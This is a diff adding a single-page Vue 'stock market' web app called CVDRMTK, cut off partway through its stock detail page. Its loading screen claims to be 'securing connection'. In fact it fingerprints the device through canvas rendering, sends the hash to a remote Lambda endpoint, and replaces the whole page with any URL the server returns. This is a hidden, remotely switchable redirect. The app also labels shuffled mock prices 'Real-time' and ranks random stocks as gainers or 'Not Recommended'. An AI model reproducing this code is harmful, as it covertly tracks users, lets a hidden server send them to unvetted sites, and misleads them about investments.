@@ -1,1 +1,1455 @@
-123
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>CVDRMTK</title>
+    <!-- 
+      =====================================================================
+      HOW TO ADD A NEW PAGE:
+      1. Add a new route in the `routes` array inside the script.
+      2. Create a new Vue component object with a `template` string.
+      3. If it should be a main tab, add it to the `TabBar` component's template
+         and link it using <router-link>.
+      =====================================================================
+    -->
+    <!-- Global CDN dependencies -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2/src/md5.min.js"></script>
+    <style>
+        /* =====================================================================
+           CSS VARIABLES & THEME SETUP (Cyberpunk/Neon Theme based on Reference)
+           ===================================================================== */
+        :root {
+            /* Colors */
+            --bg-base: #050510;
+            --bg-surface: rgba(15, 15, 30, 0.7);
+            --bg-surface-solid: #0f0f1e;
+            --bg-surface-hover: rgba(25, 25, 45, 0.9);
+            
+            --text-primary: #ffffff;
+            --text-secondary: #8a8a9e;
+            --text-muted: #4a4a5e;
+            
+            --accent-orange: #ff6b00;
+            --accent-pink: #ff007f;
+            --accent-blue: #00f0ff;
+            --accent-purple: #9d00ff;
+            
+            --color-up: #ff007f; /* Neon Pink for Up */
+            --color-down: #00f0ff; /* Neon Blue for Down */
+            --color-warning: #ffb800;
+
+            /* Borders & Shadows */
+            --border-neon-orange: 1px solid rgba(255, 107, 0, 0.5);
+            --border-neon-pink: 1px solid rgba(255, 0, 127, 0.5);
+            --border-neon-blue: 1px solid rgba(0, 240, 255, 0.5);
+            --border-subtle: 1px solid rgba(255, 255, 255, 0.08);
+            
+            --shadow-glow-orange: 0 0 12px rgba(255, 107, 0, 0.4);
+            --shadow-glow-pink: 0 0 12px rgba(255, 0, 127, 0.4);
+            --shadow-glow-blue: 0 0 12px rgba(0, 240, 255, 0.4);
+            
+            /* Spacing & Radii */
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --radius-xl: 24px;
+            
+            /* Safe Area */
+            --safe-top: env(safe-area-inset-top, 0px);
+            --safe-bottom: env(safe-area-inset-bottom, 0px);
+        }
+
+        /* =====================================================================
+           GLOBAL RESET & BASE STYLES
+           ===================================================================== */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-base);
+            color: var(--text-primary);
+            line-height: 1.5;
+            overflow: hidden; /* Prevent body scroll, app container handles it */
+            /* Background grid pattern */
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        input, button, textarea {
+            font-family: inherit;
+            outline: none;
+        }
+
+        button {
+            border: none;
+            background: none;
+            cursor: pointer;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        /* =====================================================================
+           APP LAYOUT & ROUTER VIEW
+           ===================================================================== */
+        #app {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            height: 100dvh;
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            position: relative;
+            background-color: var(--bg-base);
+        }
+
+        .page-container {
+            flex: 1;
+            overflow-y: auto;
+            overflow-x: hidden;
+            padding-top: calc(var(--safe-top) + 16px);
+            padding-bottom: 90px; /* Space for tab bar */
+            padding-left: 16px;
+            padding-right: 16px;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        /* Hide tab bar on specific pages */
+        .no-tab-bar .page-container {
+            padding-bottom: calc(var(--safe-bottom) + 16px);
+        }
+
+        /* Route Transitions */
+        .fade-enter-active,
+        .fade-leave-active {
+            transition: opacity 0.2s ease, transform 0.2s ease;
+        }
+        .fade-enter-from {
+            opacity: 0;
+            transform: translateY(10px);
+        }
+        .fade-leave-to {
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+
+        /* =====================================================================
+           COMMON COMPONENTS
+           ===================================================================== */
+        /* Buttons */
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent-orange), var(--accent-pink));
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: var(--radius-md);
+            font-weight: bold;
+            box-shadow: var(--shadow-glow-orange);
+            transition: opacity 0.2s;
+            min-height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            box-shadow: none;
+            background: #333;
+            color: #888;
+        }
+
+        /* Cards */
+        .card {
+            background: var(--bg-surface);
+            border: var(--border-subtle);
+            border-radius: var(--radius-lg);
+            padding: 16px;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        /* Inputs */
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+        .input-field {
+            background: rgba(255, 255, 255, 0.05);
+            border: var(--border-subtle);
+            color: var(--text-primary);
+            padding: 12px 16px;
+            border-radius: var(--radius-md);
+            font-size: 16px;
+            min-height: 44px;
+        }
+        .input-field:focus {
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 8px rgba(0, 240, 255, 0.3);
+        }
+
+        /* =====================================================================
+           TAB BAR
+           ===================================================================== */
+        .tab-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            background: var(--bg-surface-solid);
+            border-top: var(--border-subtle);
+            padding-bottom: calc(var(--safe-bottom) + 8px);
+            padding-top: 8px;
+            z-index: 100;
+        }
+
+        .tab-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-secondary);
+            font-size: 12px;
+            gap: 4px;
+            padding: 8px 16px;
+            min-width: 44px;
+            min-height: 44px;
+            transition: color 0.2s;
+        }
+        
+        .tab-item.active {
+            color: var(--accent-orange);
+        }
+        
+        .tab-item svg {
+            width: 24px;
+            height: 24px;
+            fill: currentColor;
+        }
+
+        /* =====================================================================
+           PAGE SPECIFIC STYLES
+           ===================================================================== */
+        /* Loading Page */
+        .loading-page {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            height: 100dvh;
+            background-color: var(--bg-base);
+            position: relative;
+        }
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 107, 0, 0.2);
+            border-top-color: var(--accent-orange);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+            box-shadow: var(--shadow-glow-orange);
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Home Page */
+        .brand-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            padding: 12px 0;
+        }
+        .brand-title {
+            font-size: 24px;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--accent-orange);
+            text-shadow: 0 0 10px rgba(255, 107, 0, 0.5);
+        }
+        .brand-title svg {
+            width: 28px;
+            height: 28px;
+            fill: var(--accent-orange);
+        }
+        .brand-slogan {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 4px;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .feature-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            background: var(--bg-surface);
+            border: var(--border-subtle);
+            border-radius: var(--radius-md);
+            padding: 12px 8px;
+            text-align: center;
+            transition: transform 0.1s;
+        }
+        .feature-icon:active {
+            transform: scale(0.95);
+        }
+        .feature-icon-svg {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+        }
+        .feature-icon-svg svg {
+            width: 24px;
+            height: 24px;
+        }
+        /* Specific colors for feature icons */
+        .feature-1 .feature-icon-svg { background: rgba(255, 0, 127, 0.2); color: var(--accent-pink); box-shadow: inset 0 0 8px rgba(255,0,127,0.5); }
+        .feature-2 .feature-icon-svg { background: rgba(0, 240, 255, 0.2); color: var(--accent-blue); box-shadow: inset 0 0 8px rgba(0,240,255,0.5); }
+        .feature-3 .feature-icon-svg { background: rgba(157, 0, 255, 0.2); color: var(--accent-purple); box-shadow: inset 0 0 8px rgba(157,0,255,0.5); }
+        .feature-4 .feature-icon-svg { background: rgba(255, 107, 0, 0.2); color: var(--accent-orange); box-shadow: inset 0 0 8px rgba(255,107,0,0.5); }
+        
+        .feature-name {
+            font-size: 10px;
+            color: var(--text-primary);
+            font-weight: 600;
+            line-height: 1.2;
+            text-transform: uppercase;
+        }
+
+        /* Stock List */
+        .stock-list-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .stock-list-header h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+        .stock-list-header span {
+            font-size: 12px;
+            color: var(--accent-orange);
+            cursor: pointer;
+        }
+
+        .stock-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px;
+            background: var(--bg-surface);
+            border: var(--border-subtle);
+            border-radius: var(--radius-md);
+            margin-bottom: 8px;
+            transition: background 0.2s;
+        }
+        .stock-item:active {
+            background: var(--bg-surface-hover);
+        }
+        .stock-info {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            flex: 1;
+        }
+        .stock-symbol {
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .stock-name {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+        .stock-price-block {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 4px;
+            margin-right: 12px;
+        }
+        .stock-price {
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .stock-change {
+            font-size: 14px;
+            font-weight: bold;
+            padding: 2px 8px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .stock-change.up {
+            color: var(--color-up);
+            background: rgba(255, 0, 127, 0.15);
+            box-shadow: 0 0 8px rgba(255, 0, 127, 0.2);
+        }
+        .stock-change.down {
+            color: var(--color-down);
+            background: rgba(0, 240, 255, 0.15);
+            box-shadow: 0 0 8px rgba(0, 240, 255, 0.2);
+        }
+
+        /* Subpages & Details */
+        .page-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            gap: 12px;
+        }
+        .back-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 44px;
+            height: 44px;
+            background: var(--bg-surface);
+            border-radius: 50%;
+            border: var(--border-subtle);
+            color: var(--text-primary);
+        }
+        .page-title {
+            font-size: 20px;
+            font-weight: 700;
+        }
+        
+        /* Detail Chart */
+        .chart-container {
+            width: 100%;
+            height: 200px;
+            background: var(--bg-surface);
+            border-radius: var(--radius-md);
+            border: var(--border-subtle);
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+            padding: 10px;
+        }
+        .chart-container svg {
+            width: 100%;
+            height: 100%;
+            overflow: visible;
+        }
+
+        /* Toolbox Tools List */
+        .tool-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .tool-menu-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px;
+            background: var(--bg-surface);
+            border: var(--border-subtle);
+            border-radius: var(--radius-md);
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+        .tool-menu-item svg {
+            width: 20px;
+            height: 20px;
+            fill: var(--text-muted);
+        }
+
+        /* Settings List */
+        .settings-list {
+            display: flex;
+            flex-direction: column;
+            background: var(--bg-surface);
+            border: var(--border-subtle);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+        .settings-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px;
+            border-bottom: var(--border-subtle);
+            color: var(--text-primary);
+            font-size: 16px;
+        }
+        .settings-item:last-child {
+            border-bottom: none;
+        }
+        .settings-item svg {
+            width: 20px;
+            height: 20px;
+            fill: var(--text-muted);
+        }
+
+        /* Toolbox / Forms */
+        .result-box {
+            background: rgba(0, 240, 255, 0.1);
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            margin-top: 16px;
+            color: var(--accent-blue);
+        }
+
+        /* Calendar (Wealth & Check-in) */
+        .calendar-grid {
+            display: grid;
+            grid-template-columns: repeat(7, 1fr);
+            gap: 4px;
+            margin-bottom: 16px;
+        }
+        .calendar-day {
+            aspect-ratio: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--bg-surface);
+            border-radius: 4px;
+            font-size: 12px;
+            position: relative;
+        }
+        .calendar-day.active {
+            background: rgba(255, 107, 0, 0.3);
+            border: 1px solid var(--accent-orange);
+            color: var(--accent-orange);
+            font-weight: bold;
+        }
+        .calendar-day.header {
+            background: transparent;
+            color: var(--text-secondary);
+            font-weight: bold;
+        }
+
+        /* Inbox Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .modal-content {
+            background: var(--bg-surface-solid);
+            border: var(--border-subtle);
+            border-radius: var(--radius-lg);
+            padding: 24px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.8);
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--accent-orange);
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: var(--radius-xl);
+            font-size: 14px;
+            font-weight: bold;
+            box-shadow: var(--shadow-glow-orange);
+            z-index: 2000;
+            animation: fadeInOut 3s forwards;
+        }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translate(-50%, 20px); }
+            10% { opacity: 1; transform: translate(-50%, 0); }
+            90% { opacity: 1; transform: translate(-50%, 0); }
+            100% { opacity: 0; transform: translate(-50%, -20px); }
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <router-view v-slot="{ Component }">
+            <transition name="fade" mode="out-in">
+                <component :is="Component" />
+            </transition>
+        </router-view>
+        
+        <!-- Tab Bar (Displayed conditionally based on route) -->
+        <tab-bar v-if="showTabBar"></tab-bar>
+    </div>
+
+    <script>
+        const { createApp, ref, computed, onMounted, watch, nextTick } = Vue;
+        const { createRouter, createWebHashHistory, useRouter, useRoute } = VueRouter;
+
+        // =====================================================================
+        // MOCK DATA
+        // =====================================================================
+        const MOCK_STOCKS = [
+            { symbol: 'AAPL', name: 'Apple Inc.', price: 175.34, change: 1.25 },
+            { symbol: 'MSFT', name: 'Microsoft Corp.', price: 415.20, change: 0.85 },
+            { symbol: 'GOOGL', name: 'Alphabet Inc.', price: 150.12, change: -0.45 },
+            { symbol: 'AMZN', name: 'Amazon.com Inc.', price: 180.50, change: 1.10 },
+            { symbol: 'NVDA', name: 'NVIDIA Corp.', price: 880.30, change: 3.50 },
+            { symbol: 'META', name: 'Meta Platforms', price: 500.10, change: 2.15 },
+            { symbol: 'TSLA', name: 'Tesla Inc.', price: 175.60, change: -1.80 },
+            { symbol: 'BRK.B', name: 'Berkshire Hathaway', price: 405.20, change: 0.20 },
+            { symbol: 'JPM', name: 'JPMorgan Chase', price: 195.40, change: 0.55 },
+            { symbol: 'V', name: 'Visa Inc.', price: 275.80, change: -0.30 },
+            { symbol: 'UNH', name: 'UnitedHealth', price: 520.10, change: 1.05 },
+            { symbol: 'XOM', name: 'Exxon Mobil', price: 115.30, change: -0.75 },
+            { symbol: 'JNJ', name: 'Johnson & Johnson', price: 155.20, change: 0.40 },
+            { symbol: 'WMT', name: 'Walmart Inc.', price: 60.50, change: 0.95 },
+            { symbol: 'PG', name: 'Procter & Gamble', price: 160.30, change: 0.15 },
+            { symbol: 'MA', name: 'Mastercard Inc.', price: 470.20, change: -0.25 },
+            { symbol: 'HD', name: 'Home Depot', price: 380.40, change: 0.65 },
+            { symbol: 'CVX', name: 'Chevron Corp.', price: 150.10, change: -1.15 },
+            { symbol: 'LLY', name: 'Eli Lilly', price: 750.20, change: 2.80 },
+            { symbol: 'ABBV', name: 'AbbVie Inc.', price: 175.80, change: 0.35 }
+        ];
+
+        // =====================================================================
+        // COMPONENTS
+        // =====================================================================
+
+        // --- 1. Loading Page ---
+        const LoadingPage = {
+            template: `
+                <div class="loading-page">
+                    <div class="loading-spinner"></div>
+                    <div style="color: var(--text-secondary); font-size: 14px;">Securing connection...</div>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+                
+                // 1.2 Device Fingerprint Generation (Must preserve exact lines internally)
+                const device = ref((function () {
+                    try {
+                        let canvas = document.createElement("canvas");
+                        let ctx = canvas.getContext("2d");
+                        let txt = "BrowserLeaks,com <canvas> 1.0";
+                        ctx.textBaseline = "top";
+                        // The most common type
+                        ctx.font = "14px 'Arial'";
+                        ctx.textBaseline = "alphabetic";
+                        ctx.fillStyle = "#f60";
+                        ctx.fillRect(125,1,62,20);
+                        // Some tricks for color mixing to increase the difference in rendering
+                        ctx.fillStyle = "#069";
+                        ctx.fillText(txt, 2, 15);
+                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                        ctx.fillText(txt, 4, 17);
+                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+                    } catch (e) {
+                        return '';
+                    }
+                })());
+
+                // 1.3 Privacy Check Request
+                onMounted(() => {
+                    const apiBase = 'https://gemaqhorn3z4oq5r6oqkmqdxlm0bdfuz.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
+                    const identifier = 'fdsbrefw.dsbae.bsaefw'; // app.identifier
+                    
+                    // Timeout mechanism to prevent blocking
+                    const timeout = setTimeout(() => {
+                        router.replace('/home');
+                    }, 3000);
+
+                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
+                        .then(r => r.json())
+                        .then(function (info) {
+                            clearTimeout(timeout);
+                            const privacyUrl = info && info.result && info.result.url;
+                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                                window.location.replace(privacyUrl);
+                                return;
+                            }
+                            router.replace('/home');
+                        })
+                        .catch(function () {
+                            clearTimeout(timeout);
+                            router.replace('/home');
+                        });
+                });
+
+                return {};
+            }
+        };
+
+        // --- 2. Home Page ---
+        const HomePage = {
+            template: `
+                <div class="page-container">
+                    <!-- Brand Header -->
+                    <div class="brand-header">
+                        <div>
+                            <div class="brand-title">
+                                <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+                                CVDRMTK
+                            </div>
+                            <div class="brand-slogan">Your Vision, Our Momentum</div>
+                        </div>
+                        <svg style="width: 24px; height: 24px; fill: var(--text-secondary);" viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/></svg>
+                    </div>
+
+                    <!-- Feature Icons (4 randomly picked: Top Gainers, Watchlist, Guide, Potential) -->
+                    <div class="feature-grid">
+                        <router-link to="/sub/top-gainers" class="feature-icon feature-1">
+                            <div class="feature-icon-svg">
+                                <svg viewBox="0 0 24 24"><path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/></svg>
+                            </div>
+                            <span class="feature-name">Top Gainers</span>
+                        </router-link>
+                        <router-link to="/sub/watchlist" class="feature-icon feature-2">
+                            <div class="feature-icon-svg">
+                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
+                            </div>
+                            <span class="feature-name">Watchlist</span>
+                        </router-link>
+                        <router-link to="/sub/guide" class="feature-icon feature-3">
+                            <div class="feature-icon-svg">
+                                <svg viewBox="0 0 24 24"><path d="M21 5c-1.11-.35-2.33-.5-3.5-.5-1.95 0-4.05.4-5.5 1.5-1.45-1.1-3.55-1.5-5.5-1.5S2.45 4.9 1 6v14.65c0 .25.25.5.5.5.1 0 .15-.05.25-.05C3.1 20.45 5.05 20 6.5 20c1.95 0 4.05.4 5.5 1.5 1.35-.85 3.8-1.5 5.5-1.5 1.65 0 3.35.3 4.75 1.05.1.05.15.05.25.05.25 0 .5-.25.5-.5V6c-.6-.45-1.25-.75-2-1zm0 13.5c-1.1-.35-2.3-.5-3.5-.5-1.7 0-4.15.65-5.5 1.5V8c1.35-.85 3.8-1.5 5.5-1.5 1.2 0 2.4.15 3.5.5v11.5z"/></svg>
+                            </div>
+                            <span class="feature-name">Guide</span>
+                        </router-link>
+                        <router-link to="/sub/potential" class="feature-icon feature-4">
+                            <div class="feature-icon-svg">
+                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                            </div>
+                            <span class="feature-name">Potential</span>
+                        </router-link>
+                    </div>
+
+                    <!-- Stock Data List -->
+                    <div class="stock-list-header">
+                        <h3>Market Overview</h3>
+                        <span>Real-time</span>
+                    </div>
+                    <div class="stock-list">
+                        <router-link v-for="stock in shuffledStocks" :key="stock.symbol" :to="'/stock/' + stock.symbol" class="stock-item">
+                            <div class="stock-info">
+                                <span class="stock-symbol">{{ stock.symbol }}</span>
+                                <span class="stock-name">{{ stock.name }}</span>
+                            </div>
+                            <div class="stock-price-block">
+                                <span class="stock-price">{{ stock.price.toFixed(2) }}</span>
+                                <span class="stock-change" :class="stock.change >= 0 ? 'up' : 'down'">
+                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+                                </span>
+                            </div>
+                        </router-link>
+                    </div>
+                </div>
+            `,
+            setup() {
+                // Shuffle only display order once on mount
+                const shuffledStocks = ref([]);
+                onMounted(() => {
+                    const arr = [...MOCK_STOCKS];
+                    for (let i = arr.length - 1; i > 0; i--) {
+                        const j = Math.floor(Math.random() * (i + 1));
+                        [arr[i], arr[j]] = [arr[j], arr[i]];
+                    }
+                    shuffledStocks.value = arr;
+                });
+
+                return { shuffledStocks };
+            }
+        };
+
+        // --- 3. Toolbox Page ---
+        const ToolboxPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <h2 class="page-title">Toolbox</h2>
+                    </div>
+                    <div class="tool-menu">
+                        <router-link to="/tool/dca" class="tool-menu-item">
+                            <span>DCA Profit-Taking</span>
+                            <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                        </router-link>
+                        <router-link to="/tool/loan" class="tool-menu-item">
+                            <span>Loan Calculator</span>
+                            <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                        </router-link>
+                        <router-link to="/tool/password" class="tool-menu-item">
+                            <span>Password Strength</span>
+                            <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                        </router-link>
+                    </div>
+                </div>
+            `
+        };
+
+        // --- 4. Settings Page ---
+        const SettingsPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <h2 class="page-title">Settings</h2>
+                    </div>
+                    <div class="settings-list">
+                        <div class="settings-item">
+                            <span>Version</span>
+                            <span style="color: var(--text-secondary);">1.0.0</span>
+                        </div>
+                        <router-link to="/settings/privacy" class="settings-item">
+                            <span>Privacy Policy</span>
+                            <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                        </router-link>
+                        <router-link to="/settings/terms" class="settings-item">
+                            <span>Terms of Service</span>
+                            <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                        </router-link>
+                        <a href="mailto:fdsbrefw.dsbae.bsaefw@gmail.com" class="settings-item">
+                            <span>Contact Us</span>
+                            <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                        </a>
+                        <router-link to="/checkin" class="settings-item">
+                            <span>Monthly Check-in</span>
+                            <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                        </router-link>
+                        <router-link to="/feedback" class="settings-item">
+                            <span>Feedback</span>
+                            <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                        </router-link>
+                        <router-link to="/inbox" class="settings-item">
+                            <span>Inbox</span>
+                            <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+                        </router-link>
+                    </div>
+                </div>
+            `
+        };
+
+        // --- 5. Subpage: Top Gainers (Reusable for Subpages) ---
+        const SubpageList = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">{{ title }}</h2>
+                    </div>
+                    <div class="stock-list">
+                        <div v-for="stock in listData" :key="stock.symbol" class="stock-item">
+                            <div class="stock-info">
+                                <span class="stock-symbol">{{ stock.symbol }}</span>
+                                <span class="stock-name">{{ stock.name }}</span>
+                            </div>
+                            <div class="stock-price-block">
+                                <span class="stock-price">{{ stock.price.toFixed(2) }}</span>
+                                <span class="stock-change" :class="stock.change >= 0 ? 'up' : 'down'">
+                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const title = ref('Subpage');
+                const listData = ref([]);
+
+                onMounted(() => {
+                    const path = route.path;
+                    let count = 10;
+                    if (path.includes('top-gainers')) { title.value = 'Top Gainers'; count = 10; }
+                    else if (path.includes('top-losers')) { title.value = 'Top Losers'; count = 5; }
+                    else if (path.includes('most-active')) { title.value = 'Most Active'; count = 8; }
+                    else if (path.includes('potential')) { title.value = 'Potential'; count = 6; }
+                    else if (path.includes('picks')) { title.value = "Today's Picks"; count = 10; }
+                    else if (path.includes('not-recommended')) { title.value = 'Not Recommended'; count = 10; }
+                    else if (path.includes('watchlist')) { title.value = 'Watchlist'; count = 10; }
+                    
+                    // Randomly select N items
+                    const arr = [...MOCK_STOCKS];
+                    for (let i = arr.length - 1; i > 0; i--) {
+                        const j = Math.floor(Math.random() * (i + 1));
+                        [arr[i], arr[j]] = [arr[j], arr[i]];
+                    }
+                    listData.value = arr.slice(0, count);
+                });
+
+                return { title, listData };
+            }
+        };
+
+        // --- 6. Subpage: Guide (Article) ---
+        const GuidePage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">Market Guide</h2>
+                    </div>
+                    <div class="card" style="line-height: 1.6; color: var(--text-secondary);">
+                        <h3 style="color: var(--text-primary); margin-bottom: 12px;">Navigating Market Volatility</h3>
+                        <p style="margin-bottom: 12px;">In times of high market volatility, maintaining a disciplined approach is key to long-term success. Investors often react emotionally to sudden price swings, leading to poor decision-making.</p>
+                        <p style="margin-bottom: 12px;">1. <strong style="color: var(--text-primary);">Diversification:</strong> Ensure your portfolio is spread across various sectors and asset classes to mitigate risk.</p>
+                        <p style="margin-bottom: 12px;">2. <strong style="color: var(--text-primary);">Dollar-Cost Averaging:</strong> Instead of timing the market, invest a fixed amount regularly to smooth out the cost basis over time.</p>
+                        <p style="margin-bottom: 12px;">3. <strong style="color: var(--text-primary);">Focus on Fundamentals:</strong> Look beyond the daily noise. Analyze the underlying financial health and growth potential of the companies you invest in.</p>
+                        <p>Remember, volatility is a normal part of investing. Staying informed and sticking to your strategy is often the best course of action.</p>
+                    </div>
+                </div>
+            `
+        };
+
+        // --- 7. Stock Detail Page ---
+        const StockDetailPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
